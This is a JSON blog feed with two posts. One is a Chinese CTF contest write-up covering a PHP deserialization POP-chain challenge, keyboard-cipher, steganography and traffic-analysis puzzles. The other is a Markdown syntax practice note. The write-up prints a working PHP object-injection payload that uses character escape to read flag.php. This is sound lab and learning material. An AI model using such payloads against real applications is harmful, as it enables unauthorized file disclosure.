{
    "version": "https://jsonfeed.org/version/1",
    "title": "imFanqie • All posts by \"随笔\" tag",
    "description": "学习博客",
    "home_page_url": "http://imfanqie.top",
    "items": [
        {
            "id": "http://imfanqie.top/2021/08/28/ctf/match/xjusec%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/",
            "url": "http://imfanqie.top/2021/08/28/ctf/match/xjusec%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/",
            "title": "xjusec考核赛解题过程",
            "date_published": "2021-08-28T10:37:25.122Z",
            "content_html": "<p>wtcl。。</p>\n<p><span id=\"more\"></span></p>\n<hr>\n<h1 id=\"web-unserialize\"><a class=\"anchor\" href=\"#web-unserialize\">#</a> web--unserialize</h1>\n<p>原码：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"index.php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Eileen'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'Ava'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span>  <span class=\"token comment\">//waf 没有屏蔽重要信息，有数量变化，直接考虑字符逃逸</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Diana</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// 创建对象时调用</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Bella</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'ico'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// 销毁对象时调用</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token variable\">$c</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'a'</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">b</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Carol</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>  <span class=\"token comment\">// 打印对象时调用</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token comment\">//flag.php</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string single-quoted-string\">'nice'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Diana</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token variable\">$b</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>本题主要考察 pop 链</p>\n<p>看到最后一行和 waf，就能发现是字符逃逸，六个变三个，每次少三个</p>\n<p>通过_toString () 方法中的 file_get_contents () 函数来读取 flag.php 的源码</p>\n<p>在 Bella 中存在字符串的拼接操作  <code>$c = 'a'.$this-&gt;b</code>  ，让此处的 $b 属性实例化为 Carol 对象即可触发__toString () 方法</p>\n<p>然后让类 Diana 的 password 属性为类 B 的实例化对象，进行序列化</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Bella</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$b</span><span class=\"token operator\">-></span><span class=\"token property\">b</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Carol</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token variable\">$b</span><span class=\"token operator\">-></span><span class=\"token property\">b</span><span class=\"token operator\">-></span><span class=\"token property\">c</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Diana</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>序列化后的结果</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token argument-name\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Diana\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"username\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"password\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Bella\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"b\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Carol\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"c\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>因为 a 和 b 参数是可以 get 的，所以可以用 a 逃掉中间的，再构造 b：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token string double-quoted-string\">\";s:8:\"</span>password<span class=\"token string double-quoted-string\">\";O:5:\"</span>Bella<span class=\"token string double-quoted-string\">\":1:&#123;s:1:\"</span>b<span class=\"token string double-quoted-string\">\";O:5:\"</span>Carol<span class=\"token string double-quoted-string\">\":1:&#123;s:1:\"</span>c<span class=\"token string double-quoted-string\">\";s:8:\"</span>flag<span class=\"token operator\">.</span>php\"<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>现在需要知道源代码 get a 和 b 参数后序列化是什么样子，借助本地跑一下（<em>其实直接看就能猜出来，直接输入后直接序列化类 Diana，所以只有 username 和 password 两个参数，直接参考上面的序列化的一部分就可以了</em>）：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token argument-name\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Diana\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">&#123;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"username\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"hah\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"password\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"hah\"</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>再参考俩序列化的结果，找到要替换的部分</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token string double-quoted-string\">\";s:8:\"</span>password<span class=\"token string double-quoted-string\">\";s:3:\"</span></pre></td></tr></table></figure><p>因为构造的 b 肯定不是个位数，而是十位数，所以上面的 3 肯定是十位数 xx</p>\n<p>总共 23 位，所以补一位 23 + 1 = 3 * 8</p>\n<p>所以 a 一共要 8 个 Eileen 替换为 Ava</p>\n<p>得到最终 payload：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">?</span>a<span class=\"token operator\">=</span>EileenEileenEileenEileenEileenEileenEileenEileen<span class=\"token operator\">&amp;</span>b<span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token string double-quoted-string\">\";s:8:\"</span>password<span class=\"token string double-quoted-string\">\";O:5:\"</span>Bella<span class=\"token string double-quoted-string\">\":1:&#123;s:1:\"</span>b<span class=\"token string double-quoted-string\">\";O:5:\"</span>Carol<span class=\"token string double-quoted-string\">\":1:&#123;s:1:\"</span>c<span class=\"token string double-quoted-string\">\";s:8:\"</span>flag<span class=\"token operator\">.</span>php\"<span class=\"token punctuation\">;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>ps：试了一下有反应但没 flag，最后各种尝试修改 payload，删了一个括号看到了 flag。。（F12）</p>\n<hr>\n<h1 id=\"crypto-tik-tak\"><a class=\"anchor\" href=\"#crypto-tik-tak\">#</a> Crypto--tik-tak</h1>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvZzF3akpIWlZwN2JLRnZ4LnBuZw==\">https://i.loli.net/2021/08/26/g1wjJHZVp7bKFvx.png</span>&quot; alt=&quot;1.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>进去之前看到提示，键盘，又对比了一下密码，得到如下信息：</p>\n<ul>\n<li>密码跟键盘有关</li>\n<li>数字都是重叠的</li>\n<li>每个重叠的为一组，不然不会需要 | 来分割</li>\n<li>应该为 12 个字母 3-3-2-4 ，可能为单词拼起来的 flag</li>\n</ul>\n<p>百度一下键盘密码，找到了相关的东西：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvQWRVbXd4VjF1UXBoSkV6LnBuZw==\">https://i.loli.net/2021/08/26/AdUmwxV1uQphJEz.png</span>&quot; alt=&quot;2.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<p>照着百度方法试着拼了一下，啥都不是</p>\n<p>仔细研究了一下，最后发现这些字母上面的字母能拼成简单的单词，那就基本没跑了！</p>\n<p>成功得到 flag: you-are-so-good</p>\n<hr>\n<h1 id=\"misc-缩小查看更多\"><a class=\"anchor\" href=\"#misc-缩小查看更多\">#</a> MISC-- 缩小查看更多</h1>\n<p>ps：签到略了</p>\n<p>下载了是一张图片，不太会，直接百度了下，图片隐写如何查看更多信息</p>\n<p>然后了解到了 StegSolve，是比较常见的藏信息的方式，抱着试了一下的心态：</p>\n<p>看到了个好玩的</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvYUdtZ0o2T3VId2t5OEZqLnBuZw==\">https://i.loli.net/2021/08/26/aGmgJ6OuHwky8Fj.png</span>&quot; alt=&quot;3.png&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>然后成功找 flag</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvbUNaYVl5Z1JqS0VzVXZTLnBuZw==\">https://i.loli.net/2021/08/26/mCZaYygRjKEsUvS.png</span>&quot; alt=&quot;4.png&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<hr>\n<h1 id=\"misc-仅仅是流量分析\"><a class=\"anchor\" href=\"#misc-仅仅是流量分析\">#</a> MISC-- 仅仅是流量分析？</h1>\n<p>这道题是真不会，于是网上搜了一下后缀，然后找到了教程。。</p>\n<p>BUUCTF-MISC-USB 差不多原题，看着做了下</p>\n<p>先是修压缩包，也没说啥软件，我就拿上次做 upload 题用的 010 editor 试了下，可以修改</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvejNObllVQmZUdWV5NTZRLnBuZw==\">https://i.loli.net/2021/08/26/z3NnYUBfTuey56Q.png</span>&quot; alt=&quot;5.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p5--&gt;</p>\n<p>找到图片，Stegslove，找到二维码：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvaUFkTVJ2ZTZmeUxHWVpXLnBuZw==\">https://i.loli.net/2021/08/26/iAdMRve6fyLGYZW.png</span>&quot; alt=&quot;6.png&quot; style=&quot;zoom: 33%;&quot; /&gt;&lt;!--p6--&gt;</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvdUlXbnBjOW00WkxPcllkLnBuZw==\">https://i.loli.net/2021/08/26/uIWnpc9m4ZLOrYd.png</span>&quot; alt=&quot;7.png&quot; style=&quot;zoom: 25%;&quot; /&gt;&lt;!--p7--&gt;</p>\n<p>扫码得到： <code>ci&#123;v3erf_0tygidv2_fc0&#125;</code></p>\n<p>用 010 打开另一个 ftm 文件，搜索关键词 key，找到了 key.pcap</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvU0t6eFJGZEFHazhIZXZyLnBuZw==\">https://i.loli.net/2021/08/26/SKzxRFdAGk8Hevr.png</span>&quot; alt=&quot;8.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p8--&gt;</p>\n<p>然后跟着 wp 做:</p>\n<p><img data-src=\"https://i.loli.net/2021/08/26/Qo8FyOxmAHV9Ejh.png\" alt=\"9.png\">&lt;!--p9--&gt;</p>\n<p>得到内容： <code>xinan</code></p>\n<p>维吉尼亚密码在线解密：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvWGhWMXlUQldTVXA4dXF4LnBuZw==\">https://i.loli.net/2021/08/26/XhV1yTBWSUp8uqx.png</span>&quot; alt=&quot;10.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p10--&gt;</p>\n<p>栅栏密码：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvN0o4UzJxM0VtZXRhNUFXLnBuZw==\">https://i.loli.net/2021/08/26/7J8S2q3Emeta5AW.png</span>&quot; alt=&quot;11.png&quot; style=&quot;zoom:33%;&quot; /&gt;&lt;!--p11--&gt;</p>\n<hr>\n<h1 id=\"misc-可爱猫猫\"><a class=\"anchor\" href=\"#misc-可爱猫猫\">#</a> MISC-- 可爱猫猫</h1>\n<p>看到两张一样图片，再一看大小 5mb，就想到双图隐写，考虑是盲水印</p>\n<p>然后用 github 上的工具 BlindWaterMark 进行盲水印图片的合成和提取</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>python bwm<span class=\"token punctuation\">.</span>py decode cat1<span class=\"token punctuation\">.</span>png cat2<span class=\"token punctuation\">.</span>png cat3<span class=\"token punctuation\">.</span>png <span class=\"token operator\">-</span><span class=\"token operator\">-</span>oldseed</pre></td></tr></table></figure><p>然后得到 cat3.png，打开，模糊能看到 flag：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMjYvc3pNUGR2aUpXZ09qYjVyLnBuZw==\">https://i.loli.net/2021/08/26/szMPdviJWgOjb5r.png</span>&quot; alt=&quot;12.png&quot; style=&quot;zoom: 50%;&quot; /&gt;&lt;!--p12--&gt;</p>\n<p>仔细读能读到，也可用 StegSolve 反转读</p>\n<p blindwatermark1234>flag</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "随笔"
            ]
        },
        {
            "id": "http://imfanqie.top/2021/06/16/(Test)%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8Bmarkdown%E8%AF%AD%E6%B3%95/",
            "url": "http://imfanqie.top/2021/06/16/(Test)%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8Bmarkdown%E8%AF%AD%E6%B3%95/",
            "title": "（Test）markdown语法复习",
            "date_published": "2021-06-16T08:24:31.783Z",
            "content_html": "<p>测试一下 blog，顺便复习一下 md 语法。</p>\n<p>测试软件为 Typora</p>\n<p><span id=\"more\"></span></p>\n<h2 id=\"一-标题\"><a class=\"anchor\" href=\"#一-标题\">#</a> 一、标题</h2>\n<p>、#  这是一级标题</p>\n<p>、## 这是二级标题</p>\n<p>、### 这是三级标题</p>\n<p>、#### 这是四级标题</p>\n<p>、##### 这是五级标题</p>\n<p>、###### 这是六级标题</p>\n<h2 id=\"二-字体\"><a class=\"anchor\" href=\"#二-字体\">#</a> 二、字体</h2>\n<p>加粗   <strong>这是加粗文字</strong></p>\n<p><strong><em>要加粗的文字左右分别用两个</em>号包起来</strong></p>\n<p>倾斜   <em>这是倾斜文字</em></p>\n<p><strong><em>要倾斜的文字左右分别用一个</em>号包起来</strong></p>\n<p>斜体加粗  <em><strong>这是斜体加粗文字</strong></em></p>\n<p><strong><em>要倾斜和加粗的文字左右分别用三个</em>号包起来</strong></p>\n<p>删除线   <s>这是加线文字</s></p>\n<p><em><strong>要加删除线的文字左右分别用两个～～号包起来</strong></em></p>\n<h2 id=\"三-引用\"><a class=\"anchor\" href=\"#三-引用\">#</a> 三、引用</h2>\n<p><em><strong>在引用的文字前加 &gt; 即可。引用也可以嵌套，如加两个 &gt;&gt; 三个 &gt;&gt;&gt;</strong></em></p>\n<blockquote>\n<p>&lt;u&gt; 这是引用的内容 &lt;/u&gt;</p>\n<blockquote>\n<p>&lt;u&gt; 这是引用的内容 &lt;/u&gt;</p>\n<blockquote>\n<p>&lt;u&gt; 这是引用过的内容 &lt;/u&gt;</p>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<blockquote>\n<p>这是引用的内容。。</p>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n</blockquote>\n<h2 id=\"四-分割线\"><a class=\"anchor\" href=\"#四-分割线\">#</a> 四、分割线</h2>\n<p><strong>三个或者三个以上的 - 或者 * 都可以。</strong></p>\n<hr>\n<hr>\n<h2 id=\"五-图片\"><a class=\"anchor\" href=\"#五-图片\">#</a> 五、图片</h2>\n<p><em><strong>格式：![图片 alt](图片地址 '' 图片 title'')</strong></em></p>\n<p><em><strong>图片 alt 就是显示在图片下面的文字，相当于对图片内容的解释。</strong></em></p>\n<p><em><strong>图片 title 是图片的标题，当鼠标移到图片上时显示的内容。title 可加可不加。</strong></em></p>\n<p>示例</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cDovL2ltZzEubHVrb3UuY29tL3N0YXRpYy9wL2Jsb2cvbWVkaXVtLzAwMjgvODAvNjYvNjMvMjg4MDY2NjMuanBn\">http://img1.lukou.com/static/p/blog/medium/0028/80/66/63/28806663.jpg</span>&quot;alt=&quot; 夜晚背景图 &quot;title=&quot; 夜空 &quot;style=&quot;zoom: 67%;&quot; /&gt;</p>\n<h2 id=\"六-超链接\"><a class=\"anchor\" href=\"#六-超链接\">#</a> 六、超链接</h2>\n<p><em><strong>[超链接名] (超链接地址 &quot;超链接 title&quot;)</strong></em></p>\n<p><em><strong>去掉 ] 后的空格，title 可加可不加！</strong></em></p>\n<p>示例：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly8yNzQwOTA4OTExLmdpdGh1Yi5pbw==\">高萌的博客</span></p>\n<h2 id=\"七-列表\"><a class=\"anchor\" href=\"#七-列表\">#</a> 七、列表</h2>\n<p><strong>语法： 无序列表用 - + * 任何一种都可以</strong></p>\n<ul>\n<li>\n<p>列表内容 （-）</p>\n<ul>\n<li>\n<p>列表内容 （+）</p>\n<ul>\n<li>列表内容 （*）</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n<p>（三种列表）</p>\n<p><em><strong>列表嵌套</strong></em></p>\n<p><em><strong>上一级和下一级之间敲三个空格即可</strong></em></p>\n<h2 id=\"八-表格\"><a class=\"anchor\" href=\"#八-表格\">#</a> 八、 表格</h2>\n<table>\n<thead>\n<tr>\n<th>表头</th>\n<th style=\"text-align:center\">表头</th>\n<th style=\"text-align:right\">表头</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>内容</td>\n<td style=\"text-align:center\">内容</td>\n<td style=\"text-align:right\">内容</td>\n</tr>\n<tr>\n<td>内容</td>\n<td style=\"text-align:center\">内容</td>\n<td style=\"text-align:right\">内容</td>\n</tr>\n</tbody>\n</table>\n<p><em><strong>直接从段落插入 更快一些。</strong></em></p>\n<h2 id=\"九-代码\"><a class=\"anchor\" href=\"#九-代码\">#</a> 九、代码</h2>\n<p><em><strong>单行代码：代码之间分别用一个反引号包起来</strong></em></p>\n<p>(`) 不用加括号</p>\n<p><code> printf(&quot;hello world\\n&quot;);</code></p>\n<p><em><strong>代码块：代码之间分别用三个反引号包起来，且两边的反引号单独占一行</strong></em></p>\n<p>(```)，结尾同理，不用加括号</p>\n<hr>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tE N D</p>\n",
            "tags": [
                "随笔"
            ]
        }
    ]
}